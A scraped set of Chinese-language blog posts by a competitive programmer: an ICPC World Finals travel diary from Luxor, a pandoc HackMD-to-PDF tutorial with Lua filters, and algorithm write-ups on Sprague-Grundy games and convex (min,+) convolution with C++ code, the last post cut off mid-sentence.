跟麥當勞，決定先去 KFC，搭計程車雖然遇到一點小風波不過 KFC 是很快的順利就到了。門口旁的髒亂程度讓人不敢恭維，但入店吹冷氣實在很爽。菜單有寫英文，而且店員懂英文，價格體感和台灣差不多，不過不收美金現金只好請 BB 刷卡。漢堡炸雞跟薯條都中規中矩，小瓶裝的百事可樂也沒有減低我們吃了數天飯店 buffet、lunch box 後吃到速食的感動。\n中規中矩的漢堡 吃完之後老師表示我們先回飯店的話太虧，就在附近繞繞慢慢走去麥當勞，但一走出冷氣房真的很讓人後悔沒有多帶一瓶水出門，感覺隨時都會中暑或是脫水。越走越覺得我的穿著跟儲水量都沒有準備好在這種太陽下待一個下午。原本打算去木乃伊博物館，結果走到一半發現他是下午五點才開，原來凡是一個正常人都不會在正中午出來活動。最後我們總算轉向麥當勞先每個人買了一杯 large 的飲料止渴。店裡看到一個在剪片的人，而且他上的字幕竟然是日文很有趣。在冷氣房待好待足之後我們才又走出去慢慢走到木乃伊博物館參觀。門口一樣有安檢。參觀結束後大約也日落了，我們回到麥當勞買晚餐，但是幾乎都坐滿人了，於是我們都覺得應該要外帶回飯店吃了。跟 KFC 比起來麥當勞的內容和台灣更加一致，我因為蠻餓的所以點了好多好多，所以甚至比我在台灣會點的還貴一點，回去之後才想起來還有前一天的 lunch box 沒吃，最終 lunch box 還是浪費了 2.5 人份。\nlarge 的雪碧，是台灣沒有的特大 size 木乃伊博物館的木乃伊 暴飲暴食之麥當勞 今天一整天走在路上常常會有人喊說 taxi taxi，或是問你搭船或馬車，或是推銷你隨機紀念品的，有的人還會用中文說你好。他們幾乎都會強調只要一美元、很便宜，我猜是真的很便宜，但我也沒有想去搭船、買紀念品的理由。\n吃完晚餐之後努力早睡，因為我們一群人報名了熱氣球明天四點必須在大廳集合。\nDay 6 睡眼惺忪的起來到飯店大廳集合，等接駁車載我們到熱氣球的地點。\n據說是因為天氣的關係遲遲無法升空，我們也就待在大廳乾等，等到都已經日出了我們才搭車出發。\n清大也參加了這個行程，雖然在不同飯店但是是一起乾等了兩個小時，結果這個車程竟然需要從島上先開到東岸再開到西岸（幾乎是閉幕典禮那邊），我也只好在車上小睡了一下。\n到了目的地之後可以說是沙塵滾滾，幸好有獎勵元發給大家口罩才不會太不舒服。熱氣球的組裝跟加熱比想像中的大聲很多，我們靠近一點之後幾乎都要大吼才能聽到對方講話。升空之後很怕手機掉下去但還是努力拍了一些照片，而且從空中可以俯瞰閉幕典禮的那個大殿，大殿前的舞台已經幾乎拆除完了。在空中的時候機長（？）一開火加熱空氣就會大聲到沒人可以講話。裝著我們的籃子在慢慢旋轉，並且風有慢慢的把我們往東邊吹，稍微可以近一點的看到尼羅河。最終我們正常降落在一塊田旁邊，是很特別的經驗。\n一大堆熱氣球與沙塵滾滾 升空後看得到閉幕典禮的場地那個大殿 結束了？ 回到飯店後，因為是下午兩點半的飛機所以我們打算搭乘十二點官方的 shuttle bus，但好像其實這一天就已經不會有 shuttle bus 了，大部分隊伍例如交大、東大都是在前一天就搭飛機走了。ICPC 給的紀念品真的好多，花了一點時間盡量塞進行李裡，並把行李整理好。\n消氣的氣球 還沒搭上車埃及航空就宣告他們會延遲一小時，我們意識到不會有 shuttle bus 之後才趕快搖了計程車前往機場，叫來的計程車實在很狂野，把行李用綁的綁在車頂上的置物空間，速度計沒有在工作而且他又開超級快，每次轉彎我都怕七個人的行李會不會全掉下去。\n這裡比去程的時候混亂多了，還沒進航廈不知道為什麼就要我們出示護照，然後那個要我們出示護照的工作人員還問我們是不是 China，旁邊就有兩個女的就說 one china one china，莫名其妙。一進去又是安檢。然後 olmrgcsi 的護照因為神秘原因從門口走過安檢再走到 checkin 櫃台的二十公尺內消失了兩次，嚇死人。機場共有兩個人幫我們推行李之後要了小費，其中過了安檢幫我們推五公尺到 checkin 櫃台的那個超級無恥要了三美金 wtf，真的是回程比去程可怕多了。\n到登機口後 BB 發現明明是登機時間了飛機好像還卡在開羅，我們等了好久好久還拿了每人一瓶似乎是補償的飲料，最後我們可以上飛機的時候已經延誤了一百分鐘了，我們心想這下在開羅得要動作快點。\n機上餐點跟來的時候一樣是一個簡單的小蛋糕，我基本上在機上是睡覺。這次起飛降落倒是比去程平穩。\n下飛機之後我們等了好久行李才跑出來，然後我們又需要跑到另一個航廈再過安檢（超 tm 久= =）才能去 checkin 櫃台，拖一拖到起飛前 53 分鐘才到 checkin 櫃台，排在我們前面的人行李似乎上去了，但我們和後面幾個人被拒絕了，emirates 表示這個延誤不干他們的事，他們飛機是準時起飛的，但很明顯這也不是我們的責任而是因為 EGA 延誤了，然後櫃台人員就一臉郭的下班走掉了，留我們一群轉 emirates 的不知道該怎麼辦。\n慌亂 現在麻煩的是因為我們是一大群人，而且 emirates 看起來不知道是要放生我們還是我們有辦法 rebook，也不知道買了機票的話誰能負責，台灣現在的時間是大半夜，旅行社或是系辦或是 BB 公司的人都很難聯絡上。所以可靠的大人 ot 和 BB 就去到處探索，我們剩下的五六個人就或坐或站在 checkin 櫃台前面待著。我們現在在過了安檢的關內，他們說如果沒有 good reason 的話很難離開這個關出去（明明就不是 passport control 也不是 custom???），並且這裡也沒有 emirates 的客服櫃台，我們要處理的話只能打電話去，但偏偏剛好前兩天杜拜淹大水的事件讓客服很難打進去。\n經過一番折騰，問了各種信用卡跟保險公司，還跑去問海豹（？）最後接通了一次 emirates 電話，由 BB 跟他們溝通，但因為我們的票變成很詭異的樣子所以那位客服又轉接給他的同事處理，然後就斷掉了。我們等到下一班的 checkin 人員來跟他們試著溝通，但他們似乎也不想或者其實也無法處理。於是我們折騰了四個小時在 emirates 上最終還是得認賠殺出，開始尋找購買其他航班的選項。原本要買卡達航空了但他們限制是必須要在四小時還三小時前買機票，踩到一個從來不知道的限制。最終幸好買到了另一家阿曼航空凌晨兩點飛往曼谷的機票，先趕快逃走開羅機場這個鬼地方再想辦法從曼谷回台北。當初肯定是想都沒想過會搭這種新奇的航空又去（我沒去過的）曼谷機場。\n順帶一提，跟我們同一班的另外幾位同樣是轉 emirates 的 ICPC 選手一位是從埃及航空那邊拿到一張往杜拜的票，另一團是直接認賠跑去搭卡達航空了，也不知道是該怪 emirates 還是怪 EGA。\n逃走 Day 7 (unexpected) 凌晨兩點趕上機，大部分都是讀阿拉伯文的中東乘客，此外很討厭的是我右邊坐了一個起飛還在一直講電話又一直擠過來的胖子。\n這架飛機只有一個走到，右邊那個胖子又吃完後很快就睡著，導致我整體感受是非常擠的。甚至上方行李櫃沒有地方可以放我的背包只能放前方座位底下，腳快縮到斷掉。坐定位才發現自己好渴，但我又非常累，邊懷疑自己會渴死一邊沉睡，聞到飛機餐出來的香味時彷彿是救世主降臨，畢竟我們除了小蛋糕以外是沒有吃午餐，趕緊的扒完後好好珍惜他順便給的那瓶水，省著慢慢喝。稍微玩了一點機上的遊戲結果玩到睡著，實在是很睏，畢竟前一天還早起去熱氣球。中間的座位真的很不舒服很難睡，保持著很睏的狀態到了阿曼。終於不用再像埃及那樣有事沒事就瘋狂安檢了，這裡的流程快也人性化很多，轉機還有麥當勞可以吃，不過我們這群人好像只有買了一小瓶飲料就要價台幣一百三十。很重要的是這邊有飲水機跟乾淨的廁所，可以說至少我們看得到的地方很人性化。\n救世主飛機餐 等待了不久我們坐上了往曼谷的飛機，這架阿曼-曼谷的飛機看起來比開羅-阿曼的飛機好多了，首先他有兩個走道看起來就比較厲害xd。飛機餐跟前一班飛機一樣是 chicken rice：用很長很中東的米包住一些雞肉作為主食，不過這班班機的主食醬汁和甜點都讓我感覺比較好吃，沒有理由。依然是中間的座位依然很難睡。抵達曼谷之後在機場逛了一下，這邊好多日式料理是想被吐槽嗎xd 我們吃了久違的東亞食物泰式料理，喝到泰奶有種莫名感動。這也是意外的第一次入境泰國，不過我們沒有離開機場，只在機場吃晚餐，等待最後回家的華航班機。\n我們看到的唯一一家超商 LAWSON 華航上面的飛機餐我選了雞肉義大利麵，入口時有種終於吃到像在家會吃到的食物的感覺，果然飛機餐還是習慣台灣的不習慣中東航空的。明明是台灣的航空但機上娛樂的麻將卻是日麻（richi mahjong），所以我跟波路都打開來玩了一下，但好像不知道怎麼結束，打到西場都還繼續打，似乎要打飛才能結束，而且也沒有流局罰符，感覺細節規則蠻微妙的，最終我吃完飛機餐後是玩到睡著了，在打瞌睡下回到台灣。不得不吐槽這趟不知道是亂流很強還是怎樣，起飛降落的搖晃跟去程埃及航空有得比。\n美味飛機餐 回到家已經是十點的事情，全身髒兮兮巴不得趕緊去洗澡完睡覺，這才是真的感受到風塵僕僕吧？\nrandom tips 旅程總算劃下句點，這邊稍微紀錄一下我這次感覺沒有準備好的旅行細節。\n帶著機票的文件出門 帶美金的話帶多點小張的美金，比較實用 帶張信用卡方便在海外刷 帶點簡單的零食在需要的時候可以吃 帶 USB-A 的線而不是 USB Type-C 的線；像我們這次搭的阿聯酋雖然有萬用插座，但其他航空都只有一個 USB-A 的充電孔（埃及航空除外，什麼都沒有） 結 wf 真的挺折騰的，假如說回程遇到的這些問題我們是去程遇到的話，感覺狀態會大大受影響。之前耳聞的台大名次是第三第四第五，這次感覺拼死拼活才勉強保住獎牌，不知道是台大不進取還是其他國太卷？又或者我們需要幸運一點遇到適合我們的題目？但還有牌應該可以知足了，這次連日本的所有隊伍都是銅牌，實在是競爭激烈。\n把整個 wf 紀錄下來實在花好多時間！\n下一篇文章如果有空的話希望會是先寫上學期的修課心得。\n","permalink":"https://omeletwithoutegg.github.io/2024/04/25/icpc-wf-luxor/","tags":["experience","blog"],"title":"ICPC World Finals @Luxor"},{"contents":"Convert HackMD to PDF via pandoc HackMD 是一個很好用的線上筆記協作工具，即使沒有重度協作拿來當個雲端 markdown 編輯器也是非常好用。\n不過當需要印成紙本或是轉成 pdf 的時候就很麻煩了，有時候 CSS 直接都會跑掉。\nMarkdown 轉 pdf 一直都是一件百家爭鳴的事情，比較主流的可能是用 typora / obsidian 等等匯出成 pdf。\n這邊打算介紹一個我學到的用 pandoc 轉 pdf 的方法。\npandoc 1 sudo pacman -S pandoc dependency 有點多，一大堆 haskell 模組。\npandoc 在把 markdown 轉成 pdf 前會某種先轉成 tex 的感覺，所以如果也熟悉 tex 的話會更上手。\nbasic 一個簡單的 .md 檔案不需要多加什麼參數就可以直接轉成 pdf\n1 pandoc hw.md -o hw.pdf 不過有幾個問題可能會遇到：\n沒有中文字 旁邊留白太多 有些語法沒有被翻譯到，例如 ::: info :::。 程式碼區塊 syntax highlighting 問題 以下就來解決以上幾個問題。\n中文字 在 .md 檔案的開頭加上以下的 YAML metadata header。\n1 2 3 4 5 6 --- babel-lang: chinese-traditional CJKmainfont: \u0026#34;AR PL UKai TW\u0026#34; header-includes: - \\usepackage{xeCJKfntef} --- 接著在 command line 指定使用 xelatex\n1 pandoc hw.md -o hw.pdf --pdf-engine=xelatex 就可以讓中文字出現了！這邊我使用的字體是標楷體 AR PL UKai TW，在 archlinux 上的 ttf-arphic-ukai。\n此外有遇到一個奇怪的問題，就是在刪除線裡面包含中文的話會編譯失敗，原因可能跟 latex 刪除線相關的 package 有關。\n見 https://github.com/jgm/pandoc/issues/9019 。\n這個問題的 workaround 我目前是使用以下的 lua-filter\n1 2 3 function Strikeout(elem) return pandoc.RawInline(\u0026#39;tex\u0026#39;, [[\\CJKsout{]] .. elem.content[1].text .. [[}]]) end 用法是把前述的 code 存成 replace-cjk-strikeout.lua 然後加一個參數\n1 pandoc hw.md -o hw.pdf --lua-filter=./replace-cjk-strikeout.lua 在 pandoc 轉檔的過程中會產生語法樹，你可以使用 lua-filter 對某些特定種類的節點做修改\n邊界問題 1 2 3 --- geometry: margin=1cm --- 忘記從哪裡查來的了\nfenced divs 這個是在解決以下被稱為 fenced_divs 的語法預設不會有任何框框的問題。\n1 2 3 ::: info 綠色背景 ::: 使用以下的 lua-filter 幫每個這種 div 都加上一個 colorbox 就可以了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function Div (elem) table = { info = \u0026#39;cyan\u0026#39;, success = \u0026#39;green\u0026#39;, warning = \u0026#39;orange\u0026#39;, danger = \u0026#39;red\u0026#39;, } color = table[ elem.classes[1] ] or \u0026#39;gray\u0026#39; return { pandoc.RawBlock(\u0026#39;latex\u0026#39;, \u0026#39;\\\\begin{tcolorbox}[beforeafter skip=1cm, ignore nobreak=true, breakable, colframe=\u0026#39; .. color .. \u0026#39;!20!white, colback=\u0026#39; .. color .. \u0026#39;!8!white, boxsep=2mm, arc=0mm, boxrule=0.5mm]\u0026#39;), elem, pandoc.RawBlock(\u0026#39;latex\u0026#39;, \u0026#39;\\\\end{tcolorbox}\u0026#39;) } end 把以上 code 存檔成 colored-fenced-divs.lua 接著在使用 pandoc 時 specify 這個 lua-filter。\n1 pandoc hw.md -o hw.pdf --lua-filter=./colored-fenced-divs.lua 程式碼區塊 預設來說，pandoc 是會幫程式碼區塊加 syntax highlight 的。\n不過如果在程式碼區塊是寫「語言 + = + 一些東西」的話，在 HackMD 裡面可能是代表跟行號有關的意思，但在 pandoc 會導致他無法辨識出語言而沒有上 syntax highlighting。\n1 2 ```javascript= ``` 不過這也簡單，就妥協都用下面這樣就好了（越多妥協越簡單）\n1 2 ```javascript ``` Conclusion \u0026amp; Reference HackMD flavour 的 markdown 真的是有夠多 extension，基本上不可能把每個 extension 都花力氣解決，例如 emoji 或是一些流程圖的 extension 我個人是完全沒有在用，這邊只是放幾個我常用而且很好解決的問題。\n主要的 reference 是 stackoverflow 跟資訊之芽系統組的 docs，因為文件原始碼就是用 pandoc 把 markdown 轉 pdf，我從那邊學來了一些 YAML XD\n最後，把本文所有 YAML 合在一起再加上一個 pdfa: yes 所得到的我常用的模板如下：\n1 2 3 4 5 6 7 8 9 --- babel-lang: chinese-traditional CJKmainfont: \u0026#34;AR PL UKai TW\u0026#34; pdfa: yes geometry: margin=1cm header-includes: - \\usepackage{xeCJKfntef} - \\usepackage[breakable]{tcolorbox} --- 1 2 3 pandoc hw.md -o hw.pdf --pdf-engine=xelatex \\ --lua-filter=./replace-cjk-strikeout.lua \\ --lua-filter=./colored-fenced-divs.lua 在 pandoc 的參數也可以指定另一個 .yml 檔案作為 metadata，不過我個人目前還是習慣直接放在 markdown 的開頭。\n","permalink":"https://omeletwithoutegg.github.io/2023/10/02/pandoc-hackmd/","tags":["linux","archlinux"],"title":"Pandoc HackMD to pdf"},{"contents":"Card Game Description 給定一個 $N \\times M$ 的棋盤，上面每格各擺了一個 $R, G, B$ 三種顏色之一的棋子\n接著雙方開始輪流操作，不能操作者就輸了，問你先手還是後手贏。\n輪到一個人時他可以做的操作有三種：\n選一個顏色 $B$ 的棋子，從該棋子的位置開始分別沿著主對角線方向走直到走到一個沒有棋子的格子或走出棋盤外，並移除那些路上經過的有棋子的格子裡面的棋子。 選一個顏色 $G$ 的棋子，從該棋子的位置開始分別沿著主及副對角線方向走直到走到一個沒有棋子的格子或走出棋盤外，並移除那些路上經過的有棋子的格子裡面的棋子。 選一個顏色 $R$ 的棋子，從該棋子的位置開始分別沿著副對角線方向走直到走到一個沒有棋子的格子或走出棋盤外，並移除那些路上經過的有棋子的格子裡面的棋子。 可以看圖更清楚：\n$1 \\leq N, M \\leq 25$\nSolution 順便用這題來講一下 SG 定理。\n無偏博奕 / 不偏賽局 在組合賽局理論裡，不偏賽局是一類任意局勢對於遊戲雙方都是平等的回合制雙人遊戲。\n我們在這篇文章中對遊戲做以下的假設：\n遊戲是兩個玩家輪流玩。 遊戲沒有平局，在有限步後一定會分出勝負。 完全訊息，所有玩家都能看到整個局勢。 局面對雙方來說平等，也就是說如果給定目前的局面，輪到哪個玩家玩可以做的動作以及導致的新盤面都要一樣。 沒有動作可以動的人輸。 可以證明給定一個局面之後，一定是「下一個玩的人贏」或是「下一個玩的人輸」。\n分別簡稱兩者為必勝態和必敗態。\n因為遊戲在有限步內會分出勝負，所以如果把局面當成節點，並且把做動作之後可以到達的局面連有向邊，形成的圖會是一張 DAG。\n按照 DAG 的拓樸順序就可以算出每個局面是必勝態或必敗態。\n然而通常來說所有從起始局面可以走到的局面會是指數級的，例如 nim game 會是 $\\prod {h_i}$ 之類的，我們通常不能真的這樣建出 DAG。\nSG 定理 上述的無偏博奕裡，每一個局面可以唯一對應到一個 nimber，或者我們常稱這個局面的 SG value。\n可以把 nimber 當成一個非負整數 $x$。在 nim game 當中只有一堆的 $x$ 個石頭的局面對應的 nimber 就是 $x$。\n一個局面對應的 nimber $x$ 代表這個遊戲中的這個局面等價於 nim game 當中 $x$ 個石頭的局面。\n假設一個局面 $u$ 做一個動作可以走到的局面集合是 $V(u)$，那局面 $u$ 的 SG value 可以遞迴的定義為\n$$\nsg(u) = \\operatorname{mex}_\\limits{v \\in V(u)}(sg(v))\n$$\n其中一堆數字的 $\\operatorname{mex}$ 是最小沒有出現在這些數字中的非負整數。\nSG value 為 $0$ 的局面是必敗態，而非零的盤面都是必勝態。\nAdding Games Together SG 最重要的就是，假設有一個新的遊戲 $C$ 是兩個人同時在玩兩個遊戲 $A, B$，每個人每回合必須恰好在其中一個遊戲做動作，兩個遊戲之間是獨立的。如果我們用 $c = a + b$ 指涉遊戲 $C$ 的局面 $c$ 由遊戲 $A$ 的局面 $a$、遊戲 $B$ 的局面 $b$ 組成，那麼\n$$\nsg(c) = sg(a) \\oplus sg(b)\n$$\n其中 $\\oplus$ 是 bitwise XOR\nnim game 不同堆之間是獨立的並且每次遊戲必須恰好在一堆做動作，藉此我們可以知道 nim game 如果每堆石頭的個數是 $h_1,\\dots,h_N$，那麼此局面對應的 SG value 就是 $h_1\\oplus\\dots\\oplus h_N$。\n應用：回到原題目 首先可以知道只有 $(i+j)$ 奇偶性相同的格子才會互相有影響，兩團棋子之間是獨立的兩個遊戲，也就是說我們會想要算出兩個局面的 SG value 再 XOR 在一起，最後看是不是 $0$ 來知道先手還是後手贏。\n這題妙的地方在於一開始整個棋盤都是棋子。先只看某個奇偶性的棋子，適當的旋轉、伸縮之後，所有棋子的集合會是某種凸的感覺。\n我們使用某個棋子之後，會把原本的棋子們切成兩團或四團互不相干的棋子，也就是說做這個動作到達的局面的 SG value 可以通過把這兩團/四團棋子的 SG value XOR 在一起算出來。\n所以我們可能會想要遞迴的計算初始局面的 SG value，會發現我們在切了幾刀之後造出的小盤面一定可以用兩個方向的區間來描述 ($l, r, d, u$ 之類的)，可以拿來當 dp 狀態，每次枚舉這個長方形裡面的棋子並看這個狀態可以到達哪些局面，再計算對應的 XOR 就是走這個棋子會到達的盤面，最後計算 mex 以得到此局面的 SG value。\n複雜度是 $O((N+M)^6)$ 可能需要小心一點常數（旋轉四十五度後，$l, r, d, u$ 的範圍只需要到 $(N+M)/2$）。\nAC code 因為這題是培訓班作業所以先把 code 遮起來\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; #define all(v) begin(v),end(v) #ifdef too_soft #define safe cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) kout(\u0026#34;\\e[1;32m[ \u0026#34; + string(#args) + \u0026#34; ]\\e[0m\u0026#34;, args) void kout() { cerr \u0026lt;\u0026lt; endl; } template \u0026lt;class T, class ...U\u0026gt; void kout(T a, U ...b) { cerr \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#39; \u0026#39;, kout(b...); } template \u0026lt;class T\u0026gt; void pary(T L, T R) { while (L != R) { cerr \u0026lt;\u0026lt; *L \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[++L == R]; } } #else #define safe ((void)0) #define debug(...) safe #define pary(...) safe #endif const int maxn = 55; int dp[maxn][maxn][maxn][maxn]; int arr[maxn * maxn]; int mex(const vector\u0026lt;int\u0026gt; \u0026amp;s) { for (int x: s) arr[x] = 1; int r = 0; while (arr[r]) ++r; for (int x: s) arr[x] = 0; return r; } int SG(char s[maxn][maxn], int N) { memset(dp, 0, sizeof(dp)); for (int l = N; l \u0026gt;= 0; l--) { for (int r = l; r \u0026lt;= N; r++) { for (int d = N; d \u0026gt;= 0; d--) { for (int u = d; u \u0026lt;= N; u++) { vector\u0026lt;int\u0026gt; tmp; for (int x = l; x \u0026lt; r; x++) { for (int y = d; y \u0026lt; u; y++) { if (s[x][y] == \u0026#39;R\u0026#39;) { tmp.push_back(dp[l][x][d][u] ^ dp[x+1][r][d][u]); } else if (s[x][y] == \u0026#39;B\u0026#39;) { tmp.push_back(dp[l][r][d][y] ^ dp[l][r][y+1][u]); } else if (s[x][y] == \u0026#39;G\u0026#39;) { tmp.push_back( dp[l][x][d][y] ^ dp[l][x][y+1][u] ^ dp[x+1][r][d][y] ^ dp[x+1][r][y+1][u]); } } } dp[l][r][d][u] = mex(tmp); } } } } return dp[0][N][0][N]; } char a[maxn][maxn]; char b[maxn][maxn]; signed main() { cin.tie(nullptr) -\u0026gt; sync_with_stdio(false); int N, M; cin \u0026gt;\u0026gt; N \u0026gt;\u0026gt; M; for (int i = 0; i \u0026lt; N; i++) { string s; cin \u0026gt;\u0026gt; s; for (int j = 0; j \u0026lt; M; j++) { if ((i ^ j) \u0026amp; 1) a[(i + j) / 2][(i - j + M - 1) / 2] = s[j]; else b[(i + j) / 2][(i - j + M - 1) / 2] = s[j]; } } int sa = SG(a, (N + M - 1) / 2 + 1); int sb = SG(b, (N + M - 1) / 2 + 1); debug(sa, sb); if (sa == sb) { cout \u0026lt;\u0026lt; \u0026#34;L\\n\u0026#34;; } else { cout \u0026lt;\u0026lt; \u0026#34;W\\n\u0026#34;; } } ","permalink":"https://omeletwithoutegg.github.io/2023/09/06/seoul-2022-A-card-game/","tags":["dp"],"title":"Seoul 2022 A : Card Game"},{"contents":"$(\\min, +)$ convolution: convex-arbitrary 因為最近打 ICPC WF 的題目遇到這個東西，所以想來寫一篇部落格。如果怕被暴雷題目的自己小心。\n先放兩個 yosupo library checker 的模板題連結。\nhttps://judge.yosupo.jp/problem/min_plus_convolution_convex_convex\nhttps://judge.yosupo.jp/problem/min_plus_convolution_convex_arbitrary\nDescription 兩個序列 $a_0,a_1,\\dots,a_n$ 和 $b_0, b_1, \\dots, b_n$ 的 $(\\min,+)$ 捲積是一個序列 $c_0,c_1,\\dots,c_{2n}$ 滿足\n$$\nc_k = \\min_{i+j=k} (a_i + b_j)\n$$\n對於一般的這個問題，目前似乎沒有任何 $O(n^{2 - \\epsilon})$ 的演算法 ($\\epsilon \u0026gt; 0$)\n不過如果 $a, b$ 兩個序列都是凸的話，就可以很輕鬆的求出 $c$ 序列。\n更一般的，只要 $a$ 是凸的，就算 $b$ 不是凸的也可以快速在 $O(n\\log n)$ 求出 $c$ 序列。\n一個序列 $x_0, x_1,\\dots, x_n$ 是凸的如果他的差分遞增，即 $x_{i+1}-x_i \\leq x_{i+2}-x_{i+1}$。\n可以想像如果把 $x_i$ 表示要拿 $i$ 個物品的成本，那 $x_i$ 是凸的就代表拿越多東西會因為邊際效應單位成本會越來越貴的感覺。\nSolution $a, b$ 都是凸的 case 很單純，首先 $c_0=a_0+b_0$，然後 $a, b$ 的差分都由小到大排序好了，我們把他們直接像 merge sort 裡面那樣 merge 就可以得到 $c$ 的差分了。這也是在說 $c$ 也會是一個凸的序列。\n證明很簡單所以允許我跳過。\n接下來是只有 $a$ 是凸的而 $b$ 的不是的情況。\n以結論來說就是轉移點單調，$k$ 遞增的時候最好的 $b_i$ index 也會遞增，即\n$$\n\\operatorname{argmin}_ \\limits i(b_i+a_{k-i}) \\leq \\operatorname{argmin}_ \\limits i(b_i+a_{k+1-i})\n$$\n注意這邊的 $\\operatorname{argmin}$ 如果有多個最小值我們取最小的 index $i$。\n證明 令\n$\\operatorname{argmin}_ \\limits i(b_i+a_{k-i}) = x$\n$\\operatorname{argmin}_ \\limits i(b_i+a_{k+1-i}) = y$\n設 $x\u0026gt;y$\n明顯 $x, y$ 都不大於 $k$。\n$$\n\\left\\{\n\\begin{matrix}\nb_x+a_{k-x} \u0026amp; \u0026lt; \u0026amp; b_y+a_{k-y} \\\\\nb_y+a_{k+1-y} \u0026amp;\\leq\u0026amp; b_x + a_{k+1-x} \\\\\n\\end{matrix}\n\\right.\n\\implies\n\\left\\{\n\\begin{matrix}\nb_x - b_y \u0026amp; \u0026lt; \u0026amp; a_{k-y} - a_{k-x} \\\\\nb_x - b_y \u0026amp;\\geq\u0026amp; a_{k+1-y} - a_{k+1-x} \\\\\n\\end{matrix}\n\\right.\n$$\n但由凸性可以知道 $a_{k-y} - a_{k-x} \\leq a_{k+1-y} - a_{k+1-x}$，所以矛盾，$x$ 必須 $\\leq y$。\n演算法 對 $k$ 分治應該是最單純的。假設目前要求解 $k \\in [kl, kr]$ 的答案，並且我們已經知道他們的轉移點只會來自 $[il, ir]$，\n那麼我們問出 $km=\\lfloor \\frac{kl+kr}{2} \\rfloor$ 的轉移來源 $i_{opt}$ 之後，我們就可以知道 $[kl, km-1]$ 的轉移來源只會來自 $[il, i_{opt}]$；$[km+1, kr]$ 的轉移來源只會來自 $[i_{opt}, ir]$。\n設區間 $[kl, kr]$ 的長度是 $x$，$[il, ir]$ 的長度是 $y$ 的話，時間複雜度的遞迴式子就是\n$$\nT(x, y) = T(x/2, a) + T(x/2, b) + O(y), \\text{where } a + b = y+1\n$$\n解出來應該是 $T(x, y) = O(x + y\\log x)$\n用 SMAWK 可以作到線性的樣子。\nAC code 其實轉移點單調分治優化通常都很好寫，只是要搞清楚有單調性的是什麼東西。\n很容易想像出一個 case 是最佳解隨著 $k$ 遞增時，在 $a_i$ 選的元素的 index 會一直上升又下降。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // An AC a day keeps the doctor away. #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; signed main() { cin.tie(nullptr) -\u0026gt; sync_with_stdio(false); int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;int\u0026gt; a(n), b(m); for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; a[i]; for (int j = 0; j \u0026lt; m; j++) cin \u0026gt;\u0026gt; b[j]; vector\u0026lt;int\u0026gt; c(n + m - 1); const auto dc = [\u0026amp;](auto self, int l, int r, int jl, int jr) { if (l \u0026gt; r) return; int mid = (l + r) / 2; int best = numeric_limits\u0026lt;int\u0026gt;::max(); int from = -1; for (int j = jl; j \u0026lt;= jr; j++) { int i = mid - j; if (i \u0026lt; 0 || i \u0026gt;= n) continue; if (best \u0026gt; a[i] + b[j]) { best = a[i] + b[j]; from = j; } } c[mid] = best; self(self, l, mid-1, jl, from); self(self, mid+1, r, from, jr); }; dc(dc, 0, n-1+m-1, 0, m-1); for (int i = 0; i \u0026lt; n+m-1; i++) cout \u0026lt;\u0026lt; c[i] \u0026lt;\u0026lt; (i+1==n+m-1 ? \u0026#39;\\n\u0026#39; : \u0026#39; \u0026#39;); } 這是模板題的 code 就是了\n例題 結果我找不到那題，只記得很類似 TIOJ 奧步戰術這題但要對所有 $k$ 輸出。\nhttps://tioj.ck.tp.edu.tw/problems/1318\n有 $N$ 個題目，每個題目最高得兩分。一開始每題得分都是零，把第 $i$ 個題目從零分變成一分需要花 $a_i$ 的時間，把第 $i$ 個題目從一分變成兩分需要花 $b_i$ 的時間。當然，不能直接跳到兩分，也就是說拿 $b_i$ 之前必須要拿 $a_i$。保證 $a_i, b_i \u0026gt; 0$。\n對於每個 $0 \\leq k \\leq 2N$ 的 $k$ 請輸出總得分 $k$ 分需要至少花多少時間。\n$k$ 固定的話，可以按照 $b_i$ 排序，必定是一個前綴取 $a_i$ 一個後綴取 $a_i+b_i$。\n所以可能可以慢慢掃用一個資料結構裡面放所有前綴的 $a_i$ 和 後綴的 $a_i+b_i$，接著每次查第 $k$ 大（後綴的人名次要佔兩名）。\n不過沿著這個思路很難做到對所有 $k$ 輸出答案。\n把題目分成兩類，一類是 $a_i \\leq b_i$，另一類是 $a_i \u0026gt; b_i$。\n設 $f_x$ 是從第一類的題目中得 $x$ 分所需要花的最小總時間。可以發現 $f_x$ 是凸的，基本上最佳策略就是把 $a_i, b_i$ 混在一起 sort 之後從小拿到大。\n另外一種想法是 $f_x$ 就是把一堆長度 $2$ 的凸序列捲積在一起，所以他自然也是凸的。\n所以如果我們能快速求出 $g_y$ 代表在第二類題目中得 $y$ 分所需要的最少時間，那我們就可以在 $O(n\\log n)$ 做 $f$ 和 $g$ 的 $(\\min, +)$ 捲積去得到最終的答案。\n觀察可以發現，在第二類題目當中得 $y$ 分的最佳解當中最多只會有一個題目是得恰好一分的，不然如果有兩個，那不如改成寫其中一題兩分的。\n所以對於偶數的 $y = 2t$，一定是拿滿前 $t$ 小的 $a_i+b_i$。\n對於 $y=2t+1$，可以知道如果拿掉那個得恰一分的題目，剩下的也是拿前 $t$ 小的 $a_i+b_i$。所以按照 $a_i+b_i$ 排的話，$y=2t+1$ 的最佳解可能是「前 $t$ 小的 $a_i+b_i$ 加上後面 $N-t$ 個題目當中 $a_i$ 最小的」或是「前 $t+1$ 小的 $a_i+b_i$ 去掉前 $t+1$ 個題目當中 $b_i$ 最大的」。\n結 最近幾天一直在跟 Voronoi Diagram 